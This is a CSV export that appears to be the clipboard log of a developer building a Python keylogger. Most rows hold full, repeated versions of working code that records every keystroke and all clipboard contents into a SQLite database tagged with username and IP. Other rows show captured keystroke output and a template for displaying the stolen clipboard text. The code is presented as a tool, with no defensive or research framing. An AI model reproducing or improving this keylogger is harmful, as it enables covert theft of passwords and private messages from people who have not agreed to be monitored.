Timestamp,Username,IP,Data
7/2/2024 9:19,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l: ""Ctrl"",
    keyboard.Key.ctrl_r: ""Ctrl"",
    keyboard.Key.shift: ""Shift"",
    keyboard.Key.shift_r: ""Shift"",
    keyboard.Key.alt: ""Alt"",
    keyboard.Key.alt_gr: ""AltGr"",
    keyboard.Key.tab: ""Tab"",
    keyboard.Key.caps_lock: ""CapsLock"",
    keyboard.Key.delete: ""Delete"",
    keyboard.Key.esc: ""Esc"",
    keyboard.Key.up: ""Up"",
    keyboard.Key.down: ""Down"",
    keyboard.Key.left: ""Left"",
    keyboard.Key.right: ""Right"",
}

special_keys = {
    keyboard.Key.enter: ""\n"",
    keyboard.Key.space: "" "",
    keyboard.Key.tab: ""\t"",
    keyboard.Key.backspace: ""[BACKSPACE]""
}

def on_release(key):
    global buffer, last_time
    try:
        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key in special_keys:
            buffer.append(special_keys[key])
            if key == keyboard.Key.enter:
                log_sentence("""".join(buffer))
                buffer = []
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            buffer.append(f""[{key}]"")

        current_time = time.time()
        if current_time - last_time > 1:
            log_sentence("""".join(buffer))
            buffer = []
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:22,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l: ""Ctrl"",
    keyboard.Key.ctrl_r: ""Ctrl"",
    keyboard.Key.shift: ""Shift"",
    keyboard.Key.shift_r: ""Shift"",
    keyboard.Key.alt: ""Alt"",
    keyboard.Key.alt_gr: ""AltGr"",
    keyboard.Key.tab: ""Tab"",
    keyboard.Key.caps_lock: ""CapsLock"",
    keyboard.Key.delete: ""Delete"",
    keyboard.Key.esc: ""Esc"",
    keyboard.Key.up: ""Up"",
    keyboard.Key.down: ""Down"",
    keyboard.Key.left: ""Left"",
    keyboard.Key.right: ""Right"",
}

special_keys = {
    keyboard.Key.enter: ""\n"",
    keyboard.Key.space: "" "",
    keyboard.Key.tab: ""\t"",
    keyboard.Key.backspace: ""[BACKSPACE]""
}

def on_release(key):
    global buffer, last_time
    try:
        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key in special_keys:
            buffer.append(special_keys[key])
            if key == keyboard.Key.enter:
                log_sentence("""".join(buffer))
                buffer = []
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            buffer.append(f""[{key}]"")

        current_time = time.time()
        if current_time - last_time > 1:
            log_sentence("""".join(buffer))
            buffer = []
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:24,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l: ""Ctrl"",
    keyboard.Key.ctrl_r: ""Ctrl"",
    keyboard.Key.shift: ""Shift"",
    keyboard.Key.shift_r: ""Shift"",
    keyboard.Key.alt: ""Alt"",
    keyboard.Key.alt_gr: ""AltGr"",
    keyboard.Key.tab: ""Tab"",
    keyboard.Key.caps_lock: ""CapsLock"",
    keyboard.Key.delete: ""Delete"",
    keyboard.Key.esc: ""Esc"",
    keyboard.Key.up: ""Up"",
    keyboard.Key.down: ""Down"",
    keyboard.Key.left: ""Left"",
    keyboard.Key.right: ""Right"",
}


def on_release(key):
    global buffer, last_time
    try:
        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_sentence("""".join(buffer))
            buffer = []
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_sentence("""".join(buffer))
            buffer = []
        elif key in modifier_keys:
            modifier = modifier_keys[key]
            buffer.append(f""[{modifier}]"")

        current_time = time.time()
        if current_time - last_time > 1:
            log_sentence("""".join(buffer))
            buffer = []
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:27,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_release(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:27,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_release(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:28,Toshiba,192.168.100.200,"Keystroke logged: this
Keystroke logged: is
Keystroke logged: not
Keystroke logged: g
Keystroke logged: ood
Keystroke logged: ata
Keystroke logged: all"
7/2/2024 9:28,Toshiba,192.168.100.200,"Toshiba
192.168.100.200

Keystroke: v

2024-07-02 09:28:06

Keystroke: all

2024-07-02 09:28:00

Keystroke: ood

2024-07-02 09:27:59

Keystroke: ata

2024-07-02 09:27:59

Keystroke: not

2024-07-02 09:27:58

Keystroke: g

2024-07-02 09:27:58

Keystroke: this"
7/2/2024 9:34,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_press(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:34,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_press(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:35,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_press(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:38,Toshiba,192.168.100.200,"Keystroke logged: tring
Keystroke logged: and
Keystroke logged: ca
Keystroke logged: does
Keystroke logged: not
Keystroke logged: wait
Keystroke logged: for
Keystroke logged: the
Keystroke logged: s
Keystroke logged: entence
Keystroke logged: to
Keystroke logged: complete
Keystroke logged: bu
Keystroke logged: t
Keystroke logged: breaking
Keystroke logged: it
Keystroke logged: nto
Keystroke logged: the
Keystroke logged: p
Keystroke logged: iece
Keystroke logged: like
Keystroke logged: this"
7/2/2024 9:39,Toshiba,192.168.100.200,"buffer = []

def log_sentence_buffer():
    global buffer
    if buffer:
        sentence = ''.join(buffer)
        log_sentence(sentence)
        buffer = []

def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_sentence_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")
"
7/2/2024 9:40,Toshiba,192.168.100.200,"def log_sentence_buffer():
    global buffer
    if buffer:
        sentence = ''.join(buffer)
        log_sentence(sentence)
        buffer = []
"
7/2/2024 9:40,Toshiba,192.168.100.200,"def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_sentence_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")"
7/2/2024 9:40,Toshiba,192.168.100.200,"def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_sentence_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")"
7/2/2024 9:42,Toshiba,192.168.100.200,"sentence = re.sub(r'\s+', ' ', sentence.replace('\n', ' '))"
7/2/2024 9:50,Toshiba,192.168.100.200,"<div class=""row row-data"">
      {% for log in clipboard_logs %}
      <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
        <p>{{ log.text }}</p>
        <p class=""timestamp text-right"">{{ log.timestamp }}</p>
      </div>"
7/2/2024 9:50,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))"
